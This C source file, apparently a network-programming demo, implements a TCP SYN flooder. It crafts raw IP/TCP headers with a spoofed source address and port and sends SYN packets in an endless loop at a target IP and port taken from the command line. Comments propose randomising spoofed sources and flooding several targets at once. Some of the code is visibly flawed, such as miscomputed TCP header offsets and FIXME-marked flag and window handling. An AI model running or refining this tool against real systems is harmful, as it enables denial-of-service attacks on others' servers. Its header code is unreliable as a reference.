/*
  Synflooding Demo

  Rather a paperdragon demonstration of a syn flooder. The demo shows
  how to set up header and work with corresponding raw socket
  implementation to send TCP/SYN messages with a spoofed source and
  source port in an endless loop.

  ---
  References:
  Unix Network Programming, Stevens (1996)
  https://beej.us/guide/bgnet/html/
  idea taken from an example at https://www.tenouk.com/Module43a.html
*/

#define _XOPEN_SOURCE 600

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>


/*
  constants
*/

#define MAXLINE  4096 /* max text line length */


/*
  forwards
*/

// error
void err_sys(const char *, ...);
void err_quit(const char *, ...);

// socket
int lothars__socket(int, int, int);
void lothars__setsockopt(int, int, int, const void *, socklen_t);
void lothars__sendto(int, const void *, size_t, int, const struct sockaddr *, socklen_t);

// inet
void lothars__inet_pton(int, const char*, void*);


/*
  helpers
*/

/*
   Print message and return to caller. Caller specifies "errnoflag".

   #include <stdarg.h>

   @errnoflag: The flag for the errno number.
   @fmt: The format.
   @ap: The argument pointer for further arguments in va_list.
*/
static void err_doit(int errnoflag, const char *fmt, va_list ap)
{
	int errno_save, n_len;
	char buf[MAXLINE + 1];

	errno_save = errno; // value caller might want printed

	vsnprintf(buf, MAXLINE, fmt, ap); // safe
//	vsprintf(buf, fmt, ap); // alternatively, if no vsnprintf() available, not safe

	n_len = strlen(buf);
	if (errnoflag) {
		snprintf(buf + n_len, MAXLINE - n_len, ": %s", strerror(errno_save));
	}

	strcat(buf, "\n");
	fflush(stdout);  // in case stdout and stderr are the same
	fputs(buf, stderr);
	fflush(stderr);
}


/* error */

/*
   Fatal error related to system call. Print message and terminate.
*/
void err_sys(const char *fmt, ...)
{
	va_list  ap;
	va_start(ap, fmt);
	err_doit(1, fmt, ap);
	va_end(ap);
	exit(EXIT_FAILURE);
}


/*
   Fatal error unrelated to system call. Print message and terminate.
*/
void err_quit(const char *fmt, ...)
{
	va_list  ap;
	va_start(ap, fmt);
	err_doit(0, fmt, ap);
	va_end(ap);
	exit(EXIT_FAILURE);
}


/* socket */

/*
  The socket() function shall create an unbound socket in a
  communications domain, and return a file descriptor that can be used
  in later function calls that operate on sockets.

  #include <sys/socket.h>

  @family: Specifies the communications domain in which a socket is to
      be created.
  @type: Specifies the type of socket to be created.
  @protocol: Specifies a particular protocol to be used with the
      socket. Specifying a protocol of 0 causes socket() to use an
      unspecified default protocol appropriate for the requested
      socket type.
*/
int lothars__socket(int family, int type, int protocol)
{
	int res;
	if (0 > (res = socket(family, type, protocol))) {
		err_sys("%s() error", __func__);
	}
	return res;
}


/*
  The setsockopt() function shall set the option specified by the
  option_name argument, at the protocol level specified by the level
  argument, to the value pointed to by the option_value argument for
  the socket associated with the file descriptor specified by the
  socket argument.

  #include <sys/socket.h>

  @fd: The socket file descriptor to provide the peer address.
  @level: The level argument specifies the protocol level at which the
      option resides.
  @optname: The option_name argument specifies a single option to be
      set.
  @optval: The value stored in the object pointed to.
  @optlenptr: The option_len argument shall be modified to indicate
      the actual length of the value.
*/
void lothars__setsockopt(int fd
			 , int level
			 , int optname
			 , const void *optval
			 , socklen_t optlen)
{
	if (0 > setsockopt(fd, level, optname, optval, optlen)) {
		close(fd);
#if _XOPEN_SOURCE >= 500
		sync();
#endif
		err_sys("%s() error", __func__);
	}
}


/*
  The sendto() function shall send a message through a connection-mode
  or connectionless-mode socket. If the socket is connectionless-mode,
  the message shall be sent to the address specified by dest_addr. If
  the socket is connection-mode, dest_addr shall be ignored.

  #include <sys/socket.h>

  @fd: Specifies the socket file descriptor.
  @ptr: Points to a buffer containing the message to be sent.
  @nbytes: Specifies the size of the message in bytes.
  @flags: Specifies the type of message transmission.
  @sa: Points to a sockaddr structure containing the destination
      address.
  @salen: Specifies the length of the sockaddr structure pointed to by
      the dest_addr argument.
*/
void lothars__sendto( int fd
	      , const void *ptr
	      , size_t nbytes
	      , int flags
	      , const struct sockaddr *sa
	      , socklen_t salen)
{
	if ((ssize_t) nbytes != sendto(fd, ptr, nbytes, flags, sa, salen)) {
		err_sys("%s() error", __func__);
	}
}


/*
  inet_pton - convert IPv4 and IPv6 addresses from text to binary form

  This function converts the character string src into a network
  address structure in the af address family, then copies the network
  address structure to dst. The af argument must be either AF_INET or
  AF_INET6.

  #include <arpa/inet.h>

  @family: The address family AF_INET or AF_INET6 (af).
  @strptr: Points to a source string containing an IP address (src).
  @addrptr: Points to a destination string, in case of a struct
  in_addr, defer to its s_addr member to be initialized.

  Returns 1 on success, 0 if strptr did not contain a valid internet
  address and -1 if family was not a valid address family.
*/
void lothars__inet_pton(int family, const char *strptr, void *addrptr)
{
	int res;
	if (0 > (res = inet_pton(family, strptr, addrptr))) {
		err_sys("%s() error for %s (check the passed address family?)", __func__, strptr); // errno set
	} else if (0 == res) {
		err_quit("%s() error for %s (check the passed strptr)", __func__, strptr); // errno not set
	}
}


/********************************************************************************************/
// worker implementation

/*
  TCP flags, if needed

  #define URG 32
  #define ACK 16
  #define PSH 8
  #define RST 4
  #define SYN 2
  #define FIN 1
*/

/*
  IP header
*/
struct ipheader {
	unsigned char      iph_ihl:5, /* Little-endian */
		iph_ver:4;
	unsigned char      iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned char      iph_flags;
	unsigned short int iph_offset;
	unsigned char      iph_ttl;
	unsigned char      iph_protocol;
	unsigned short int iph_chksum;
	unsigned int       iph_sourceip;
	unsigned int       iph_destip;
};

/*
  TCP header
*/
struct tcpheader {
	unsigned short int   tcph_srcport;
	unsigned short int   tcph_destport;
	unsigned int             tcph_seqnum;
	unsigned int             tcph_acknum;
	unsigned char          tcph_reserved:4, tcph_offset:4;
	unsigned int  tcp_res1:4,              /* little-endian */
		tcph_hlen:4,                   /* length of tcp header in 32-bit words */
		tcph_fin:1,                    /* finish flag "fin" */
		tcph_syn:1,                    /* synchronize sequence numbers to start a connection */
	 	tcph_rst:1,                    /* reset flag */
		tcph_psh:1,                    /* push, sends data to the application*/
		tcph_ack:1,                    /* acknowledge */
		tcph_urg:1,                    /* urgent pointer */
		tcph_res2:2;
	unsigned short int   tcph_win;
	unsigned short int   tcph_chksum;
	unsigned short int   tcph_urgptr;
};


/*
*/
unsigned short checksum(unsigned short *buf, int nwords)
{
	unsigned long sum;

	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return (unsigned short)(~sum);
}



/********************************************************************************************/


/*
  main
*/
int main(int argc, char *argv[])
{
	/* open raw socket */
	int sd = -1;
 	// this buffer will contain ip header, tcp header, and payload we'll
	// point an ip header structure at its beginning, and a tcp header
	// structure after that to write the header values into it
	char datagram[4096];
	struct ipheader *iph = NULL;
	struct tcpheader *tcph = NULL;
	struct sockaddr_in sin;
	int one = 1;
	unsigned int floodport = 0;
	char serverip[24];

	// init
	memset(datagram, '\0', 4096);
	memset(serverip, '\0', sizeof(serverip));

	if (argc != 3) {
		fprintf(stderr, "usage: %s <destination ip> <port to be flooded>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	strncpy(serverip, argv[1], sizeof(serverip));
	fprintf(stdout, "serverip: %s\n", serverip);

	floodport = atoi(argv[2]);
	fprintf(stdout, "floodport: %u\n", floodport);

	sd = lothars__socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	// the sockaddr_in structure containing the destination
	// address is used in sendto() to determine the datagrams
	// path
	sin.sin_family = AF_INET;

	// you byte-order >1 byte header values to network byte order
	// (not needed on big-endian machines)
	sin.sin_port = htons(floodport);
	lothars__inet_pton(AF_INET, serverip, &sin.sin_addr.s_addr);

	// we'll now fill in the ip/tcp header values
	iph = (struct ipheader *) datagram;
	iph->iph_ihl = 5;
	iph->iph_ver = 4;
	iph->iph_tos = 0;

	// just datagram, no payload. You can add payload as needed
	iph->iph_len = sizeof(*iph) + sizeof(*tcph);

	// the value doesn't matter here
	iph->iph_ident = htonl (54321);
	iph->iph_offset = 0;
	iph->iph_ttl = 255;
	iph->iph_protocol = 6;  // upper layer protocol, TCP

	// set it to 0 before computing the actual checksum later
	iph->iph_chksum = 0;

	// SYN's can be blindly spoofed.  Better to create randomly
	// generated IP to avoid blocking by firewall
	lothars__inet_pton(AF_INET, "192.168.77.77", &iph->iph_sourceip); // TODO improve this     

	// Better if we can create a range of destination IP,
	// so we can flood all of them at the same time
	iph->iph_destip = sin.sin_addr.s_addr;

	// arbitrary port for source
	tcph = (struct tcpheader *) datagram + sizeof(*iph);
	tcph->tcph_srcport = htons(5678); // TODO improve       
	tcph->tcph_destport = htons(floodport);

	// in a SYN packet, the sequence is a random
	tcph->tcph_seqnum = random();

	// number, and the ACK sequence is 0 in the 1st packet
	tcph->tcph_acknum = 0;
	tcph->tcph_res2 = 0;

	// first and only tcp segment
	tcph->tcph_offset = 0;

	// initial connection request, I failed to use TH_FIN,
	// so check the tcp.h, TH_FIN = 0x02 or use #define TH_FIN 0x02
	tcph->tcph_syn = 1; //(uint8_t) 0x02; // FIXME: defined as 1 bit, but 0x02 is more then 1 bit         

	// maximum allowed window size
	tcph->tcph_win = htonl (65535); // TODO            

	// if you set a checksum to zero, your kernel's IP stack should
	// fill in the correct checksum during transmission.
	tcph->tcph_chksum = 0;
	tcph->tcph_urgptr = 0;

	// integrity check
	iph->iph_chksum = checksum((unsigned short *) datagram, iph->iph_len >> 1);

	// a IP_HDRINCL call, to make sure that the kernel knows
        //  the header is included in the data, and doesn't insert
	// its own header into the packet before our data
	lothars__setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
	fprintf(stdout, "OK, using your own header!\n");

	// this is a "paperdragon" version of
	// flooding-in-slow-motion.. left as a demonstration
	while (1) {
		lothars__sendto(sd,                 // our socket
			  datagram,                 // the buffer containing headers and data
			  iph->iph_len,             // total length of our datagram
			  0,                        // routing flags, normally always 0
			  (struct sockaddr *) &sin, // socket addr, just like in
			  sizeof (sin));
		fprintf(stderr, "flooding %s at %u...\n", serverip, floodport); // slows down...
	}

	fprintf(stdout, "READY.\n");
	exit(EXIT_SUCCESS);
}
